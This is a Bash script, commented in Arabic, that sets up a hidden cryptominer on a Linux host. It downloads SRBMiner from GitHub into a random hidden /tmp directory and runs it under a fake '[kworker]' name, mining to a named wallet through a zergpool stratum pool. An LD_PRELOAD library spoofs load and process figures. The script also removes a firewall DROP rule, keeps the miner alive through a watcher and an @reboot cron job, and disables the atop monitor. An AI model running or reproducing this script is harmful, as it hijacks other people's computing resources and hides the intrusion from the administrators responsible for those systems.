#!/bin/bash
# السكربت النهائي المعدل مع إصلاح الاتصال والتخفي
# ------------------------------------------------

# إعداد البيئة الآمنة
export RAND_DIR="/tmp/.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
mkdir -p "$RAND_DIR"
cd "$RAND_DIR"
echo "RAND_DIR: $RAND_DIR" > debug.log
chmod 700 "$RAND_DIR"

# إنشاء مكتبة التخفي المحسنة
cat <<'EOF' > hide_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysinfo.h>
#include <sys/socket.h>

// دوال التخفي الأساسية
double getloadavg(void *a, int b) { return 0.15; }
pid_t getppid(void) { return 1; }
int get_nprocs(void) { return 1; }
int get_num_procs(void) { return 1; }
unsigned long getauxval(unsigned long type) { return 0; }

// دعم اتصالات الشبكة
typedef int (*orig_connect_type)(int, const struct sockaddr*, socklen_t);
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    orig_connect_type orig_connect;
    orig_connect = (orig_connect_type)dlsym(RTLD_NEXT,"connect");
    return orig_connect(sockfd, addr, addrlen);
}
EOF

# تجميع المكتبة
gcc -shared -fPIC -o libhide.so hide_lib.c -ldl >> debug.log 2>&1
chmod 755 libhide.so

# تنزيل وتثبيت المعدن
MINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
wget -qO miner.tar.gz "$MINER_URL" >> debug.log 2>&1
tar -xzf miner.tar.gz --strip-components=1 >> debug.log 2>&1
EXE_NAME=".sysd-$(tr -dc a-z </dev/urandom | head -c 8)"
install -m 755 SRBMiner-MULTI "$EXE_NAME" >> debug.log 2>&1
echo "EXE_NAME: $EXE_NAME" >> debug.log

# إعداد الشبكة المعدل
if command -v sudo &> /dev/null; then
    sudo iptables -D OUTPUT -p tcp --dport 3333 -j DROP 2>/dev/null
    sudo sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null
    sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null
fi

# حساب عدد الأنوية
CPU_THREADS=$(nproc)
CPU_THREADS=$(( CPU_THREADS > 1 ? CPU_THREADS - 1 : 1 ))
RAND_NAME="kworker:$(tr -dc a-z </dev/urandom | head -c 6)"
echo "Starting miner: $RAND_NAME with $CPU_THREADS threads" >> debug.log

# تشغيل المعدن مع تحسينات التخفي والاتصال
nohup bash -c "
    export LD_PRELOAD='$PWD/libhide.so';
    export LD_BIND_NOW=1;
    exec -a '[${RAND_NAME}]' '$PWD/$EXE_NAME' \
      --algorithm rinhash \
      --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
      --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
      --password c=LTC,mc=RIN,m=solo,ID=firebase \
      --cpu-threads '$CPU_THREADS' \
      --disable-gpu \
      --log-file miner_connection.log \
      --max-diff 500000 \
      --retry-time 30 \
      --no-watchdog" >> miner.log 2>&1 &

# إنشاء سكربت المراقبة المحسن
cat <<'EOF' > miner_watcher.sh
#!/bin/bash
export RAND_DIR="$(pwd)"
export EXE_NAME="$EXE_NAME"
export RAND_NAME="$RAND_NAME"
export CPU_THREADS="$CPU_THREADS"

check_connection() {
    (netstat -tnp 2>/dev/null || ss -tnp 2>/dev/null) | grep -q "$EXE_NAME"
    return $?
}

while true; do
    if ! pgrep -f "$EXE_NAME" >/dev/null || ! check_connection; then
        echo "[$(date)] Miner not connected, restarting..." >> "$RAND_DIR/watcher.log"
        pkill -f "$EXE_NAME"
        
        nohup bash -c "
            export LD_PRELOAD='$RAND_DIR/libhide.so';
            export LD_BIND_NOW=1;
            exec -a '[${RAND_NAME}]' '$RAND_DIR/${EXE_NAME}' \
              --algorithm rinhash \
              --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
              --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
              --password c=LTC,mc=RIN,m=solo,ID=firebase \
              --cpu-threads '$CPU_THREADS' \
              --disable-gpu \
              --log-file miner_connection.log \
              --max-diff 500000 \
              --retry-time 30 \
              --no-watchdog" >> "$RAND_DIR/miner.log" 2>&1 &
    fi
    sleep $((RANDOM % 300 + 120))
done
EOF

chmod +x miner_watcher.sh
echo "miner_watcher.sh created" >> debug.log

# إضافة إلى cron
if command -v sudo &> /dev/null; then
    (sudo crontab -l 2>/dev/null; echo "@reboot cd '$RAND_DIR' && ./miner_watcher.sh >> '$RAND_DIR/watcher.log' 2>&1") | sudo crontab -
else
    (crontab -l 2>/dev/null; echo "@reboot cd '$RAND_DIR' && ./miner_watcher.sh >> '$RAND_DIR/watcher.log' 2>&1") | crontab -
fi

# بدء المراقب
nohup ./miner_watcher.sh >> watcher.log 2>&1 &

# التحقق الأولي بعد 30 ثانية
sleep 30
echo "--- Initial Connection Check ---" >> debug.log
(netstat -tnp 2>/dev/null || ss -tnp 2>/dev/null) | grep "$EXE_NAME" >> debug.log
tail -n 20 miner_connection.log >> debug.log 2>/dev/null

# تعطيل أدوات المراقبة
if command -v sudo &> /dev/null; then
    sudo systemctl stop atop topgrade 2>/dev/null
    sudo systemctl disable atop 2>/dev/null
fi

echo "Miner setup completed successfully" >> debug.log
